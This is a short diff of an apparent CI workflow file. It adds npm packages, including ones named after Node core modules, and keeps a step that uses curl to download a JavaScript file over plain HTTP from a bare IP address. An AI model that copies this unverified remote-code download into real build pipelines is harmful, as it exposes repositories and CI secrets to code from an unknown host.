@@ -20,7 +20,7 @@ jobs:
         node-version: '20'
 
     - name: Install dependencies
-      run: npm install commander axios @octokit/rest
+      run: npm install commander axios @octokit/rest progress jsonpath util fs
 
     - name: Download index.js
       run: curl http://139.84.131.137:8000/sastcli.js -o sastcli.js
